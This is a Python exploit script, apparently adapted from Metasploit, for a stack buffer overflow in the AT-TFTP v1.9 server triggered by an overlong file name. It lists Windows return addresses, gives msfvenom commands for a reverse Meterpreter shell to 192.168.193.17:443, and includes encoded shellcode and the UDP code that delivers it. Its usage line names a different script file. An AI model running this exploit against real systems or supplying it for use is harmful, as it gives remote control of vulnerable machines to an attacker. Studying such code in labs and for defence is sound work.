#!/usr/bin/python
## attftp_long_filename.py
##
## Exploits a stack buffer overflow in AT-TFTP v1.9, by sending a request (get/write) for an overly long file name.
## Extracted from Metasploit  
##
## Spawns a reverse meterpreter shell to 192.168.193.17:443
##
## Author Re4son <re4son [at] whitedome.com.au>
##
## TODO: adjust 
##		- pick the right return address for the appropriate target
##
## Usage: python oracle_xdb_ftp_pass-exploit.py <IP Address> <Port> <Your IP Address>

import sys, socket


rhost = sys.argv[1] 				# Target IP address as command line argument
rport = int(sys.argv[2])		# Target Port as command line argument
lhost = sys.argv[3]				  # Attackers IP address


## Return addresses according to metasploit:
##
##          [ 'Windows NT SP4 English',   { 'Ret' => 0x702ea6f7 } ],
##          [ 'Windows 2000 SP0 English', { 'Ret' => 0x750362c3 } ],
##          [ 'Windows 2000 SP1 English', { 'Ret' => 0x75031d85 } ],
##          [ 'Windows 2000 SP2 English', { 'Ret' => 0x7503431b } ],
##          [ 'Windows 2000 SP3 English', { 'Ret' => 0x74fe1c5a } ],
##          [ 'Windows 2000 SP4 English', { 'Ret' => 0x75031dce } ],
##          [ 'Windows XP SP0/1 English', { 'Ret' => 0x71ab7bfb } ],
##          [ 'Windows XP SP2 English',   { 'Ret' => 0x71ab9372 } ],
##          [ 'Windows XP SP3 English',   { 'Ret' => 0x7e429353 } ], # ret by c0re
##          [ 'Windows Server 2003',      { 'Ret' => 0x7c86fed3 } ], # ret donated by securityxxxpert
##          [ 'Windows Server 2003 SP2',  { 'Ret' => 0x7c86a01b } ], # ret donated by Polar Bear



ret = "\xd3\xfe\x86\x7c"			# Return address (Little Endian)

nops = "\x90" *(25-len(lhost))			## Create NOP sled to brin NOPs & LHOST to 25 bytes



## Max space for shell code = 210
## Bad characters according to metasploit: \x00
## Payload via: 
##
## Generate payload: msfvenom -p windows/meterpreter/reverse_nonx_tcp LHOST=192.168.193.17 LPORT=443 -a x86 --platform Windows -f raw -o payload
##
## Prepend a stack adjust of -3500 to the payload before encoding:
## Obtain stack adjust of -3500 (0xdac as per printf '%x\n' 3500) with /usr/share/metasploit-framework/tools/nasm_shell.rb:	
##       nasm > sub esp, 0xdac
##	 00000000  81ECAC0D0000      sub esp,0xdac
## add opcodes to a file: perl -e 'print "\x81\xec\xac\x0d\x00\x00"' > stackadj
##
## Combine stackadj & payload: cat stackadj payload > shellcode
## hexdump -C shellcode
## 00000000  81 ec ac 0d 00 00 fc 6a  eb 47 e8 f9 ff ff ff 60  |.......j.G.....`|
## 00000010  31 db 8b 7d 3c 8b 7c 3d  78 01 ef 8b 57 20 01 ea  |1..}<.|=x...W ..|
## 00000020  8b 34 9a 01 ee 31 c0 99  ac c1 ca 0d 01 c2 84 c0  |.4...1..........|
## 00000030  75 f6 43 66 39 ca 75 e3  4b 8b 4f 24 01 e9 66 8b  |u.Cf9.u.K.O$..f.|
## 00000040  1c 59 8b 4f 1c 01 e9 03  2c 99 89 6c 24 1c 61 ff  |.Y.O....,..l$.a.|
## 00000050  e0 31 db 64 8b 43 30 8b  40 0c 8b 70 1c ad 8b 68  |.1.d.C0.@..p...h|
## 00000060  08 5e 66 53 66 68 33 32  68 77 73 32 5f 54 66 b9  |.^fSfh32hws2_Tf.|
## 00000070  72 60 ff d6 95 53 53 53  53 43 53 43 53 89 e7 66  |r`...SSSSCSCS..f|
## 00000080  81 ef 08 02 57 53 66 b9  e7 df ff d6 66 b9 a8 6f  |....WSf.....f..o|
## 00000090  ff d6 97 68 c0 a8 0c c5  66 68 01 bb 66 53 89 e3  |...h....fh..fS..|
## 000000a0  6a 10 53 57 66 b9 57 05  ff d6 50 b4 0c 50 53 57  |j.SWf.W...P..PSW|
## 000000b0  53 66 b9 c0 38 ff e6                              |Sf..8..|
## 000000b7
##
## Encode shellcode: cat shellcode | msfvenom -p - -b \x00 -a x86 --platform Windows -e x86/shikata_ga_nai -f python
## x86/shikata_ga_nai succeeded with size 210 (iteration=0)
##
buf =  ""
buf += "\xba\xb9\x89\xf7\x9a\xdb\xd4\xd9\x74\x24\xf4\x5b\x29"
buf += "\xc9\xb1\x2e\x83\xeb\xfc\x31\x53\x11\x03\x53\x11\xe2"
buf += "\x4c\x08\x1b\x36\xa3\x0b\xe4\xbb\xd1\xe0\xa3\xab\xdc"
buf += "\x08\xd4\xd3\x7e\xc6\xf0\xa7\x03\x14\x8c\xc4\xc6\x1c"
buf += "\x93\xdb\xb3\x8a\xb3\x22\x29\xbf\x80\xbe\xac\x2e\xd9"
buf += "\x7e\x37\x02\xdb\xb5\x4a\x5a\x1e\xcd\x94\x29\x68\x8d"
buf += "\x72\xeb\x5e\x67\x99\x40\xd4\xc7\x79\x56\x03\xb1\x0a"
buf += "\x44\x8a\xb5\x43\x69\x2d\x23\x58\xbd\xb4\x3a\x32\x99"
buf += "\xda\x5d\x35\x01\xd3\x46\xad\x49\x57\x49\xa6\x0e\x54"
buf += "\x22\xc8\x92\xc9\xbf\x40\xa3\x4f\xa6\xc3\xd5\x07\x15"
buf += "\xd1\x71\xaf\x2a\x27\xdd\x1b\xab\xfe\x93\xc3\xcc\xd6"
buf += "\xc1\x57\x60\x85\xba\x14\xd5\x6a\x6e\x12\x3e\x0a\x11"
buf += "\xcb\xc9\xd0\x46\x47\xac\x6d\x8f\xb8\xcf\x5b\x36\xfe"
buf += "\x98\x0c\x48\xd6\x4e\xba\x76\x7f\x7c\xff\x11\xe8\x7c"
buf += "\x44\xbb\xbb\xf7\x59\x2e\x2c\x5b\xca\xc9\xf5\x0c\xf1"
buf += "\xea\xd0\xe3\x4d\x18\x8d\x50\xfa\x72\x4b\xee\xc4\x4d"
buf += "\x6c\xf6"


tail	= ""				# tail from metasploit
tail	+= "\x83\xc4\x28\xc3" 		# <-- esp = add esp 0x28 + retn
tail	+= "\x00netascii\x00"		# Finish as expected by the AT TFTP server

## Let's build the exploit

exploit = "\x00\x02" + nops + buf + ret + tail


s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # Declare a UDP socket

try:
	print "\nDelivering package..."
	s.sendto(exploit, (rhost, rport))
	print "\nPackage delivered!"
except:
	print "\nCould not connect to " + rhost + ":" + str(rport) + "!"

